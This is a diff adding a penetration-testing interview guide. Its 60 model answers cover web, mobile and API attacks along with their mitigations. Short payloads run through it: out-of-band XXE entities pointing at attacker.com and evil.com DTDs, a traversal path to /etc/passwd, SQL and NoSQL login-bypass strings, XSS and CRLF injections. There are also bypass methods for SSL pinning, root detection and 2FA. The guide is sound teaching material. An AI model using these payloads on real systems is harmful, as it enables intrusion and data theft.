@@ -1,0 +1,668 @@
+Q1: What is Java Deserialization? 
+Candidate Answer: 
+"Java deserialization is the process of converting a stream of bytes back into a Java object. This 
+becomes dangerous when an attacker is able to tamper with serialized data and send it to the 
+server for deserialization. If the application is using vulnerable libraries like Apache Commons 
+Collections, it may lead to remote code execution. 
+During a web application pentest, if I observe serialized Java objects in cookies, POST data, or 
+API requests, I’ll test for insecure deserialization using gadget chains and tools like ysoserial. 
+To mitigate this, I recommend using signed tokens, implementing object input filters in Java 9+, 
+or whitelisting classes allowed for deserialization." 
+�
+� Q2: If you have obtained an NTLM hash but cannot decrypt it, how can you 
+still use it? 
+Candidate Answer: 
+"Even if I can't decrypt the NTLM hash directly, I can still leverage it using a Pass-the-Hash 
+(PtH) technique. In this method, I can authenticate to systems that accept NTLM authentication 
+by submitting the hash instead of the actual password. 
+Alternatively, I could perform NTLM relay attacks to escalate privileges, or try cracking the 
+hash using tools like Hashcat with a wordlist. This approach is often useful in Active Directory 
+environments where lateral movement is possible." 
+�
+� Q3: What are Honeypots? 
+Candidate Answer: 
+"Honeypots are security mechanisms that simulate vulnerable services or systems to attract 
+attackers. They are primarily used to monitor attacker behavior, detect intrusion attempts, and 
+gather threat intelligence. 
+As a pentester, I remain cautious of honeypots during internal assessments, especially if I see 
+systems with open services but low interaction. I'd monitor unusual responses, alerts, or 
+fingerprinting traps." 
+�
+� Q4: What is a Buffer Overflow? 
+Candidate Answer: 
+"A buffer overflow occurs when a program writes more data to a buffer than it can hold, which 
+can overwrite adjacent memory and potentially lead to code execution or system crashes. 
+In pentesting, if I find input fields with no validation — especially in older C/C++ applications 
+— I’ll test with long payloads using tools like pattern_create in Metasploit to check memory 
+corruption. 
+Mitigations include stack canaries, DEP, ASLR, and proper bounds checking during 
+development." 
+�
+� Q5: How would you remotely access an internal-only service? 
+Candidate Answer: 
+"If a service is only accessible internally, I’d try to gain access through pivoting or lateral 
+movement after compromising an internal system. 
+Another approach is to use a reverse shell, where I convince the internal system to connect back 
+to me, bypassing ingress restrictions. 
+Tools like Chisel, Ngrok, or SSH tunneling can also help establish a connection if I have initial 
+foothold inside. The goal is to tunnel the internal service out to my controlled system for further 
+exploitation." 
+�
+� Q6: What measures would you implement to prevent brute-force attacks? 
+Candidate Answer: 
+"To prevent brute-force attacks, I would implement several layers of defense: 
+• First, I’d add rate limiting and account lockout after a number of failed 
+attempts. 
+• I'd use CAPTCHA to distinguish bots. 
+• Implement 2FA to add an extra layer even if the password is compromised. 
+• Use a WAF to detect and block abnormal login patterns. 
+For API endpoints, I’d also implement IP-based throttling and monitor failed login metrics." 
+�
+� Q7: Serialization happens in which languages? 
+Candidate Answer: 
+"Serialization is common across most modern programming languages. For example: 
+• Java uses ObjectOutputStream. 
+• Python uses pickle or json modules. 
+• PHP uses serialize/unserialize. 
+• .NET has BinaryFormatter and other serializers. 
+• JavaScript mainly uses JSON.stringify(). 
+This is important from a security perspective because insecure deserialization can be exploited 
+differently in each language depending on the internal object handling." 
+�
+� Q8: What is Out-of-Band XXE? 
+Candidate Answer: 
+"Out-of-Band (OOB) XXE occurs when the server doesn’t return data in the HTTP response, but 
+instead makes an external call — for example, to an attacker-controlled DNS or HTTP server. 
+I usually test this by crafting a payload that forces the server to fetch a DTD or file and 
+exfiltrates data over DNS. For instance, with a payload like <!ENTITY % ext SYSTEM 
+'http://attacker.com/evil.dtd'>, I can trick the server into reaching out externally. 
+This works best when blind responses are returned or when firewalls block regular XXE 
+exfiltration." 
+�
+� Q9: How do you mitigate XXE vulnerabilities? 
+Candidate Answer: 
+"The safest mitigation is to disable DTDs and external entities completely in the XML parser: 
+• For Java, I use 
+factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true) 
+• In .NET, I set DtdProcessing = Prohibit 
+• For Python, I use defusedxml library 
+If DTDs are required for business reasons, I validate against strict XML schemas (XSD) and 
+restrict file access permissions. Also, I recommend parsing with non-vulnerable libraries like 
+lxml or moving to JSON formats where possible." 
+�
+� Q10: What is Second Order SQL Injection? 
+Candidate Answer: 
+"Second-order SQL injection happens when malicious input is stored in the database and later 
+used in a query context that becomes vulnerable. The key here is that the payload does not 
+execute immediately but gets triggered later during a different transaction. 
+I test for this by injecting payloads during registration or profile update, and observing if they get 
+executed during search or reporting features later. This usually requires tracking the full data 
+lifecycle in the application." 
+✅ Part 2: Web Application Pentesting – XSS, CSRF, LFI, 
+HTTP Security Flags 
+�
+� Q11: How can you identify if a website is vulnerable to DOM-based XSS? 
+Candidate Answer: 
+"To identify DOM-based XSS, I start by looking at client-side JavaScript — especially how it 
+handles user input via location, document.URL, or document.referrer. If that input is passed 
+to unsafe sinks like innerHTML, document.write(), or eval(), it's a red flag. 
+I use tools like DOM Invader (Burp Suite Pro), browser DevTools, and try injecting test 
+payloads like <img src=x onerror=alert(1)> in fragments or query parameters. 
+Mitigation involves using safe JavaScript functions like textContent instead of innerHTML, 
+and proper input sanitization on the client side using libraries like DOMPurify." 
+�
+� Q12: What’s the difference between LFI and Directory Traversal? 
+Candidate Answer: 
+"Directory traversal is a broader term — it refers to accessing files outside the intended directory 
+using sequences like ../../. 
+LFI, or Local File Inclusion, is when an attacker uses this technique to load files through 
+application input. The vulnerable application includes local files dynamically, often through 
+parameters like ?page=home.php. 
+For example, changing it to ?page=../../../../etc/passwd can expose system files. 
+So, directory traversal is the technique, and LFI is a specific vulnerability resulting from it." 
+�
+� Q13: How would you escalate an LFI to Remote Code Execution? 
+Candidate Answer: 
+"LFI to RCE can be achieved if: 
+• Log injection is possible. For example, I inject PHP code into server logs by 
+manipulating the User-Agent header. Then I include 
+/var/log/apache2/access.log using the LFI. 
+• If file upload is allowed elsewhere, I upload a malicious file and include it via 
+LFI. 
+• If php://input is enabled and accessible through LFI, I can send code in the 
+body and include php://input. 
+These scenarios allow me to execute arbitrary code through the inclusion of attacker-controlled 
+files." 
+�
+� Q14: What is the importance of the HttpOnly flag on cookies? 
+Candidate Answer: 
+"The HttpOnly flag prevents JavaScript from accessing cookies. This is critical because in case 
+of a Cross-site Scripting (XSS) attack, an attacker won't be able to steal session cookies via 
+document.cookie. 
+It’s especially important for session management cookies, because preventing access via 
+JavaScript helps reduce the risk of session hijacking. 
+However, it does not stop the cookie from being sent with every HTTP request — it only 
+protects it from being accessed through client-side scripts." 
+�
+� Q15: Can you bypass CSRF protections if a token is implemented? 
+Candidate Answer: 
+"If CSRF tokens are implemented correctly, it's generally hard to bypass. But I test for: 
+• Token reuse: If the same token is valid for all users or sessions. 
+• Token in GET: If token is passed in a URL, it’s more likely to be leaked. 
+• Referer/Origin checks missing. 
+• CORS misconfigurations: If the app allows credentials from foreign origins, 
+CSRF can still work. 
+If I find the token is static, predictable, or not tied to the session, I can still perform CSRF by 
+crafting a malicious form submission." 
+�
+� Q16: Can CSRF still occur in JSON-based APIs? 
+Candidate Answer: 
+"Yes, CSRF is still possible in JSON-based APIs if the server accepts requests with Content
+Type: application/json from cross-origin sources and has Access-Control-Allow
+Credentials enabled. 
+However, browsers block sending application/json content type without CORS preflight — 
+so if CORS is misconfigured and credentials are allowed from untrusted domains, CSRF is 
+possible. 
+I test this by sending JSON POST requests via JavaScript using fetch() and inspecting if the 
+API accepts it cross-origin." 
+�
+� Q17: What is a Double Submit Cookie? Will CSRF still work? 
+Candidate Answer: 
+"In the double submit cookie technique, a CSRF token is set both as a cookie and as a request 
+parameter or header. The server checks that both values match. 
+Since JavaScript cannot read the cookie if HttpOnly is set, the attacker cannot set both values. 
+So if implemented properly, this prevents CSRF — assuming the token is unpredictable and 
+bound to the user." 
+�
+� Q18: What is CRLF Injection? 
+Candidate Answer: 
+"CRLF Injection exploits the fact that HTTP headers are separated by Carriage Return (\r) and 
+Line Feed (\n). If user input is injected into headers without sanitization, it can allow an attacker 
+to inject new headers or even create a fake HTTP response. 
+For example, I can inject %0d%0aSet-Cookie: hacked=1 in a location header to set a malicious 
+cookie. 
+It's tested by manipulating parameters used in headers and observing response manipulation." 
+�
+� Q19: What is SSRF? How do you test it? 
+Candidate Answer: 
+"Server-Side Request Forgery (SSRF) occurs when an attacker forces the server to make HTTP 
+requests to internal or external systems. 
+I test for SSRF by passing internal IPs like 127.0.0.1, 169.254.169.254, or custom URLs like 
+burp collaborator or requestbin. 
+Commonly exploitable parameters include image URLs, webhook endpoints, or PDF generators. 
+Impact includes: 
+• Port scanning internal systems 
+• Reading internal metadata (cloud) 
+• RCE via SSRF chaining (e.g., Redis, Gopher) 
+Mitigation: whitelist domains, avoid dynamic URL fetching, and restrict internal IP ranges." 
+Coming next: 
+• File upload → to XXE, RCE, bypasses 
+• SQL injection (Types, blind, time-based, JWT) 
+• SOP vs CORS 
+• API Security (JWT, CORS, Rate Limit, Enum, NoSQLi) 
+✅ Part 3: File Upload Vulnerabilities, SQLi, CORS/SOP, 
+JWT, and SSRF to RCE 
+�
+� Q20: How do you test for file upload vulnerabilities? 
+Candidate Answer: 
+"I begin by uploading files with different extensions like .php, .jsp, or .aspx to see if the 
+application filters based only on extension. I also try double extensions like file.php.jpg, or 
+uppercase extensions like FILE.PHP. 
+Then I check if the file is executed or just stored. If accessible via browser, I try uploading a 
+simple web shell to test for RCE. 
+I also look for content-type and magic byte checks. Sometimes, uploading an Excel or image 
+with embedded payload can trigger XXE or CSV injection." 
+�
+� Q21: Can you explain SQL Injection and its types? 
+Candidate Answer: 
+"SQL Injection occurs when unsanitized input is used to dynamically construct SQL queries. 
+Types include: 
+• Classic SQLi: ' OR 1=1 -- 
+• Error-based SQLi: Triggering SQL errors to leak data 
+• Blind SQLi: No errors or output, using Boolean or Time-based inference 
+• Union-based SQLi: Using UNION SELECT to extract data 
+• Second-order SQLi: Payload stored and later executed in different context 
+I test using payloads like ' OR '1'='1 or time delays like SLEEP(5) in suspected inputs." 
+�
+� Q22: What is Blind SQL Injection and why no error is shown? 
+Candidate Answer: 
+"In Blind SQLi, the application doesn't return database errors or outputs. Instead, I observe 
+behavioral differences. 
+For Boolean-based Blind SQLi, I might send ' AND 1=1 vs ' AND 1=2 and see if the page 
+changes. 
+For Time-based, I use payloads like ' OR IF(1=1, SLEEP(5), 0) to measure response delay. 
+Errors might be hidden because of custom error handling or WAF filtering, but the logic can still 
+be broken." 
+�
+� Q23: What is SOP and how is it different from CORS? 
+Candidate Answer: 
+"Same-Origin Policy (SOP) is a browser security feature that blocks access to resources between 
+different origins (scheme + domain + port). 
+CORS is a controlled relaxation of SOP. It allows servers to specify which origins can access 
+resources using headers like Access-Control-Allow-Origin. 
+SOP is enforced by browsers by default. CORS must be explicitly configured on the server." 
+�
+� Q24: How do you exploit CORS misconfiguration? 
+Candidate Answer: 
+"I look for wildcards or reflections in Access-Control-Allow-Origin. For example: 
+• If the server reflects Origin: attacker.com and includes Access-Control
+Allow-Credentials: true, I can steal data by sending authenticated cross
+origin requests. 
+• If * is used with credentials: true, it's an instant vulnerability. 
+I exploit this using JavaScript on my malicious domain to read sensitive data from the victim’s 
+authenticated session." 
+�
+� Q25: What is JWT and how do you test it? 
+Candidate Answer: 
+"JWT or JSON Web Token is used for stateless authentication. It has three parts: Header, 
+Payload, and Signature. 
+During testing, I: 
+• Check if alg is set to none (legacy vuln). 
+• Try signing with my own key if symmetric (HS256). 
+• Check for expired or weak tokens. 
+• Try manipulating the payload (e.g., changing admin:false to admin:true) to see 
+if it's validated server-side. 
+I also test for token disclosure, predictable secrets, and replay vulnerabilities." 
+�
+� Q26: Can SQL Injection occur in JWT tokens? 
+Candidate Answer: 
+"Not directly in the JWT itself, but if the server parses JWT claims into a database query — for 
+example, extracting username from the token and building a raw query — SQL Injection is 
+possible. 
+I check if any claims are reflected in parameters that interact with the database, then test standard 
+payloads. 
+Proper validation and parameterized queries should always be used even for JWT claims." 
+�
+� Q27: How do you escalate SSRF to RCE? 
+Candidate Answer: 
+"I escalate SSRF to RCE by: 
+• Using SSRF to access metadata endpoints like AWS 169.254.169.254, then 
+extract keys and abuse exposed services. 
+• Targeting internal services like Redis, Gopher or Docker APIs — injecting 
+commands to gain remote code execution. 
+• If the application supports image/pdf rendering via remote URLs, I try hosting a 
+file that leads to a file inclusion or unsafe deserialization. 
+SSRF is highly dangerous, especially in cloud and microservices environments." 
+Coming Next: 
+✅ Part 4: Mobile Application Pentesting (Frida, SSL Pinning, Root Detection, APK 
+Reversing) 
+✅ Part 5: Business Logic, Authentication Flaws, Account Takeover, IDOR, XSS bypass 
+✅ Part 6: API Pentesting – Rate Limiting, Enum, Tokens, CORS, NoSQLi 
+✅ Part 7: Source Code Review, OWASP Top 10 Latest, Real-Life Case Studies 
+✅ Part 4: Mobile Application Security – Interview-Style 
+Answers 
+Covering: 
+• SSL Pinning 
+• Frida & Objection 
+• Root Detection 
+• APK Reversing 
+• Mobile-specific CSRF, Clickjacking, Local Storage, Hardcoded Keys 
+�
+� Q28: What is SSL Pinning and how do you bypass it? 
+Candidate Answer: 
+"SSL Pinning is a technique used in mobile apps to prevent MITM attacks. The app has a copy 
+of the server's certificate (or public key) and validates the certificate chain manually, rather than 
+relying on the system trust store. 
+To bypass SSL pinning: 
+• I first try runtime hooking using Frida with SSL pinning bypass scripts. 
+• If that fails, I recompile the APK using JADX + apktool, remove the pinning 
+logic (e.g., TrustManager, HostnameVerifier), and rebuild the app. 
+• Tools like Objection or Xposed modules like JustTrustMe also help in dynamic 
+bypass." 
+�
+� Q29: What is Frida and how do you use it in mobile testing? 
+Candidate Answer: 
+"Frida is a dynamic instrumentation toolkit used to hook and modify mobile app functions at 
+runtime. It’s extremely useful for bypassing security controls, analyzing method calls, and 
+modifying app behavior without modifying the APK. 
+I use Frida to: 
+• Bypass SSL pinning 
+• Dump decrypted runtime strings or tokens 
+• Hook sensitive functions like getDeviceId() or SharedPreferences.get() 
+• Monitor API call arguments 
+I run it on a rooted Android emulator or device and connect using frida-server." 
+�
+� Q30: Is rooting required to run Frida? 
+Candidate Answer: 
+"Rooting is recommended but not mandatory. 
+• If I want to attach Frida to a system-level process or inspect native calls, rooting 
+helps. 
+• However, for most APK-based app testing, I can use Frida Gadget — it’s a 
+shared object I inject into the app before recompiling it. This lets me use Frida 
+even without root." 
+�
+� Q31: What is android:allowBackup=true? Is it a vulnerability? 
+Candidate Answer: 
+"Yes, if android:allowBackup=true is set in the AndroidManifest.xml, any app data can be 
+backed up using adb backup, even without root. 
+This can expose: 
+• Auth tokens 
+• Database files 
+• Preferences including PII 
+I test this by installing the app and running adb backup, then extracting and analyzing the data. 
+Mitigation is setting android:allowBackup=false in the manifest." 
+�
+� Q32: If debuggable=true is enabled, will JavaScript execute? 
+Candidate Answer: 
+"If debuggable=true, it allows an attacker to attach a debugger like Android Studio or Frida. 
+While it doesn’t directly impact JavaScript execution, it lowers the security of the app because: 
+• I can inspect memory, variables, and flow. 
+• If it uses a WebView, I can inject JavaScript into the WebView context. 
+It’s a misconfiguration that should only be enabled during development, not in production." 
+�
+� Q33: How do you detect and exploit hardcoded keys in a mobile app? 
+Candidate Answer: 
+"I decompile the APK using tools like JADX or apktool. Then I search for keywords like 
+secret, apiKey, password, or Base64 patterns. 
+If I find hardcoded JWT signing keys, AWS secrets, or encryption keys, I attempt: 
+• JWT manipulation (e.g., forging tokens) 
+• Decrypting stored data 
+• Replaying API requests that require authentication 
+Hardcoded secrets are a major risk because anyone with the APK can reverse them." 
+�
+� Q34: If you find sensitive keys in local storage, what do you do? 
+Candidate Answer: 
+"I check if sensitive data like tokens, credentials, or encryption keys are stored in: 
+• SharedPreferences 
+• SQLite DB 
+• Keychain (iOS) 
+• File system 
+If found, I try to extract them and replay APIs. 
+I also check file permissions to ensure they aren’t world-readable. 
+I recommend using encrypted storage like Android Keystore or iOS Keychain, instead of plain 
+local storage." 
+�
+� Q35: What is Clickjacking in mobile apps? 
+Candidate Answer: 
+"Clickjacking is an attack where a malicious app overlays transparent elements on top of the 
+target app to trick the user into clicking unintended buttons. 
+On Android, this is done using SYSTEM_ALERT_WINDOW or Toast overlays. 
+I test this by writing a PoC app that overlays UI over the app in question. 
+To prevent this, developers should set filterTouchesWhenObscured=true or override 
+onFilterTouchEventForSecurity() in custom views." 
+�
+� Q36: Can CSRF happen in mobile apps? 
+Candidate Answer: 
+"Yes, CSRF can happen if the mobile app uses embedded WebViews for authentication or 
+sensitive operations. 
+If an attacker tricks the app into loading a malicious HTML or JS that performs a state-changing 
+request to the same origin, CSRF is possible. 
+However, if the app uses proper token-based APIs with no cookie-based auth, CSRF is generally 
+not a concern. 
+Mitigation includes using anti-CSRF tokens and avoiding cookie-based sessions in WebViews." 
+�
+� Q37: How do you bypass root detection in Android apps? 
+Candidate Answer: 
+"To bypass root detection, I: 
+• Hook isRooted() or checkRootAccess() functions using Frida to always return 
+false 
+• Rename or hide root binaries (su, busybox, magisk) 
+• Patch Smali code during APK decompilation to remove root checks 
+Some apps also use advanced root detection like checking build tags, mounted partitions, or 
+running su. 
+Objection has built-in features to bypass common root detection methods." 
+�
+� Q38: How do you decompile and recompile an Android APK? 
+Candidate Answer: 
+"I use tools like: 
+• apktool: To decode and rebuild resources and Smali code 
+• JADX: For Java-level reverse engineering 
+• keytool + jarsigner: To re-sign the APK 
+Steps: 
+1. apktool d app.apk – decode 
+2. Modify Smali/manifest 
+3. apktool b app -o mod.apk – rebuild 
+4. Re-sign with a debug key 
+5. Install and test 
+This is useful for bypassing SSL pinning, modifying hardcoded values, or disabling protections." 
+✅ Part 5: Authentication Bypass, 2FA, Business Logic, 
+IDOR, and Account Takeovers 
+Interview-Style Answers — as you, the candidate 
+�
+� Q39: What is the difference between Authentication and Authorization? 
+Candidate Answer: 
+"Authentication is the process of verifying who a user is, while Authorization determines what 
+that user can access. 
+For example, when I log into a banking app with my credentials, that’s authentication. Once 
+logged in, being allowed to view only my own transactions — not others’ — is authorization. 
+In pentesting, I validate both by: 
+• Bypassing login for authentication 
+• Accessing unauthorized resources (e.g., via IDOR) for authorization flaws." 
+�
+� Q40: What is Two-Factor Authentication (2FA)? Can it be bypassed? 
+Candidate Answer: 
+"2FA requires a second factor in addition to password — typically a time-based OTP or push 
+notification. 
+I test for bypass by: 
+• Checking if 2FA is enforced everywhere or only during login 
+• Replaying valid session tokens from a device that already passed 2FA 
+• Trying OTP reuse or rate-limiting issues 
+• Brute-forcing weak OTPs if no limit is present 
+I also check for insecure implementations like exposing OTPs via logs or email." 
+�
+� Q41: How do you bypass authentication? 
+Candidate Answer: 
+"I check for: 
+• Default or weak credentials 
+• Logic flaws like password reset without proper validation 
+• SQL injection in login 
+• Missing CAPTCHA or lockout after multiple failed logins 
+• Session fixation or token predictability 
+I always attempt to understand how the authentication flow works — for example, how tokens 
+are issued and if they’re bound to IP or device — to try session replay or token manipulation." 
+�
+� Q42: What is an IDOR? How do you test for it? 
+Candidate Answer: 
+"IDOR, or Insecure Direct Object Reference, is when access control isn’t enforced properly on 
+user-supplied input, allowing attackers to access unauthorized resources by modifying 
+identifiers. 
+I test for this by: 
+• Changing user IDs, invoice numbers, file names in URLs or requests 
+• Observing whether access is denied or the object is served without checks 
+I also try automation using tools like Burp Intruder to enumerate sequential or predictable IDs. 
+If I can access another user’s data, it’s a critical finding." 
+�
+� Q43: How do you test for Account Takeover? 
+Candidate Answer: 
+"I test flows like: 
+• Password reset: Does it allow resetting without proper ownership verification? 
+• Email/phone change: Can I change another user’s email without re
+authenticating? 
+• Session fixation: Can I force a victim to use a session I control? 
+I also check if forgotten-password or 2FA flows are vulnerable to logic flaws or missing 
+verification steps. 
+One example I encountered involved resetting another user’s password by intercepting the reset 
+link and replacing the email parameter." 
+�
+� Q44: What are Business Logic Vulnerabilities? Give an example. 
+Candidate Answer: 
+"Business logic flaws occur when application behavior can be abused in ways not intended by 
+the developer — often bypassing rules or validations. 
+For example, in a payment flow, I once bypassed coupon usage restrictions by sending the 
+discount parameter twice, leading to multiple discounts being applied. 
+I look for: 
+• Order manipulation (modifying price) 
+• Race conditions (double withdrawals) 
+• Discount abuse 
+• Limit bypass (e.g., uploading unlimited files) 
+These issues often require understanding the application flow, not just scanning for CVEs." 
+�
+� Q45: How would you test a payment application for business logic flaws? 
+Candidate Answer: 
+"I simulate: 
+• Modifying the payment amount client-side 
+• Replaying payment success APIs without actual payment 
+• Cancelling a transaction after payment confirmation 
+• Applying multiple coupons or negative values 
+I also test how the app handles currency conversion, refunds, and balance updates. 
+Business logic testing requires both technical and functional understanding of how the 
+application is expected to behave." 
+�
+� Q46: If XSS is found but CSRF protection is implemented, can it still be 
+exploited? 
+Candidate Answer: 
+"Yes. Even if CSRF protection is implemented using tokens, an attacker with XSS can read and 
+steal that token using JavaScript, then make an authenticated request on behalf of the victim. 
+XSS bypasses CSRF protection because it executes in the context of the victim’s session — so 
+any cookie or token is already available. 
+That’s why combining vulnerabilities like XSS + CSRF leads to full session compromise." 
+�
+� Q47: How do you identify session fixation vulnerabilities? 
+Candidate Answer: 
+"I try to set a session token before login — either by sending my own cookie or using an exposed 
+session. Then, I log in and see if the session remains unchanged. 
+If yes, I can pre-set a session, trick the victim into logging in, and take over their session. 
+Fixation happens when tokens aren’t regenerated after authentication. 
+Mitigation: Always issue a fresh session token upon successful login." 
+�
+� Q48: What is the difference between Privilege Escalation and IDOR? 
+Candidate Answer: 
+"IDOR is about accessing unauthorized resources (like another user’s data) by modifying object 
+references. 
+Privilege escalation is broader — it involves gaining higher privileges than intended. For 
+example, accessing admin-only features as a regular user by manipulating roles or tokens. 
+In some cases, IDOR leads to horizontal escalation, and if admin functions are exposed, it 
+becomes vertical privilege escalation." 
+�
+� Q49: What are Referrer and Origin headers used for? 
+Candidate Answer: 
+"Referrer and Origin headers help verify the source of a request — often used in CSRF 
+protection and CORS validation. 
+• Referrer shows the full URL of the previous page. 
+• Origin shows the scheme, domain, and port only. 
+I test if the server validates these headers to block unauthorized cross-origin requests. In CSRF 
+protection, some apps use Origin checks to ensure safe requests." 
+✅ Part 6: API Security – Rate Limiting, CORS, JWT, 
+Enumeration, NoSQLi 
+�
+� Q50: What is API Rate Limiting and how do you test for it? 
+Candidate Answer: 
+"Rate limiting restricts the number of requests a user or client can make to an API in a given time 
+period, usually to prevent abuse or brute-force attacks. 
+I test it by: 
+• Sending high volumes of requests (e.g., login attempts) using Burp Intruder or a 
+custom script 
+• Checking for consistent HTTP status codes like 429 Too Many Requests 
+• Analyzing Retry-After headers 
+If rate limiting is missing or IP-based only, I rotate IPs or use headers like X-Forwarded-For to 
+bypass it." 
+�
+� Q51: How do you enumerate users in an API? 
+Candidate Answer: 
+"I look at: 
+• Registration or login responses — if error messages differ for existing vs. non
+existing usernames 
+• Password reset responses — if the API confirms user existence 
+• GraphQL introspection or REST user ID leaks 
+I also use Burp Intruder to test a large list of usernames or emails and look for response 
+differences like status codes, error messages, or response length." 
+�
+� Q52: How do you test for CORS misconfiguration in APIs? 
+Candidate Answer: 
+"I send preflight (OPTIONS) requests with custom Origin: attacker.com, and see if: 
+• Access-Control-Allow-Origin reflects the attacker domain 
+• Access-Control-Allow-Credentials: true is present 
+If both are true, and the API uses cookie-based auth, it’s exploitable via cross-origin requests. 
+I write a malicious HTML/JS page to send credentialed requests to the API, which the victim's 
+browser would honor." 
+�
+� Q53: How do you test JWTs in APIs? 
+Candidate Answer: 
+"I inspect how the token is generated and validated: 
+• Change algorithm to none (for legacy bugs) 
+• Modify payload (e.g., role=admin) 
+• Try brute-forcing the secret if using HS256 and weak key 
+I also test for: 
+• Expired token reuse 
+• Token replay 
+• Signature not being validated 
+Tools like jwt.io or Burp Extensions help decode and manipulate tokens." 
+�
+� Q54: What is NoSQL Injection? How do you detect it in APIs? 
+Candidate Answer: 
+"NoSQL Injection happens when unsanitized input is passed to NoSQL queries like MongoDB. 
+For example, in a login API, instead of sending { "username": "admin", "password": 
+"123" }, I send: 
+kotlin 
+CopyEdit 
+{ "username": { "$ne": null }, "password": { "$ne": null } } 
+If this returns a token or a successful login, the API is vulnerable. 
+I also try payloads with $gt, $regex, and test for error-based and blind injections. 
+Proper input validation and using parameterized queries in NoSQL libraries mitigate this." 
+✅ Part 7: Source Code Review, OWASP Top 10, & Real
+World Pentest Experience 
+�
+� Q55: What do you look for during a source code review? 
+Candidate Answer: 
+"I look for: 
+• Insecure input handling (eval(), string concatenation for SQL, unsafe 
+deserialization) 
+• Missing auth checks 
+• Secrets in code (API keys, passwords, tokens) 
+• Insecure configurations (debug=true, allowBackup, hardcoded credentials) 
+• Insecure use of crypto (md5, base64, weak key management) 
+For example, in Java, I look at functions like readObject(), ObjectInputStream for 
+deserialization issues, and in PHP, I check for unserialize() or insecure use of include()." 
+�
+� Q56: What are some OWASP Top 10 issues you’ve found in real apps? 
+Candidate Answer: 
+"Yes, I’ve discovered: 
+• Broken Access Control via IDOR on invoice systems 
+• Business Logic Flaw where referral codes were reused to generate unlimited 
+balance 
+• Insecure Deserialization in a Java-based form upload feature that led to RCE 
+• XSS in a feedback form due to improper encoding 
+• CSRF on a change-password API with token reuse 
+These were impactful because they involved sensitive data and financial manipulation." 
+�
+� Q57: Can you give an example of a vulnerability you're proud to have found? 
+Candidate Answer: 
+"Yes — during a black box engagement, I exploited a vulnerable GraphQL endpoint to 
+enumerate internal user IDs. 
+Then, using an insecure password reset flow with predictable tokens, I reset an admin user’s 
+password. 
+This led to full admin access, from which I extracted sensitive documents and discovered a 
+misconfigured AWS S3 bucket with confidential backups. 
+It was a full kill chain — from IDOR to account takeover to data exfiltration." 
+�
+� Q58: What are parameter entities in XXE and why are they dangerous? 
+Candidate Answer: 
+"Parameter entities in XML are defined using <!ENTITY % name SYSTEM 'url'>. 
+They’re dangerous because they allow defining external content, which can be fetched by the 
+parser. 
+For example, using: 
+xml 
+CopyEdit 
+<!ENTITY % ext SYSTEM "http://evil.com/malicious.dtd"> 
+I can pull in a malicious DTD that performs out-of-band data exfiltration using error messages or 
+HTTP requests. 
+This enables OOB XXE, even when output is suppressed." 
+�
+� Q59: What is the difference between path traversal and directory listing? 
+Candidate Answer: 
+"Directory listing allows browsing contents of a directory if index files are missing and listing is 
+enabled — e.g., listing all /uploads/. 
+Path traversal is a vulnerability where attackers navigate to parent directories using ../, to 
+access files outside the allowed scope. 
+Directory listing is a misconfiguration; path traversal is an actual vulnerability that can lead to 
+credential or source code exposure." 
+�
+� Q60: What is Web Cache Poisoning? 
+Candidate Answer: 
+"Web Cache Poisoning manipulates HTTP headers or parameters so that a cache server stores a 
+malicious version of a page, which is then served to others. 
+I test for this by manipulating headers like Host, X-Forwarded-Host, X-Original-URL, or 
+appending unexpected query parameters. 
+For example, injecting <script>alert(1)</script> in a parameter that is reflected but cached. 
+If the cache key doesn’t differentiate user input correctly, malicious content can persist." 
+✅ You’re now covered across: 
+• Web App Security 
+• Mobile App Security 
+• API Security 
+• Source Code Review 
+• Business Logic Bugs 
+• OWASP Top 10 (with real-world examples) 
+• Latest attack vectors (XXE, SSRF, JWT abuse, Web Cache Poisoning, etc.) 
+• Tool-based, black-box and grey-box techniques 
+• Interview-suitable, confident explanations 
+ 
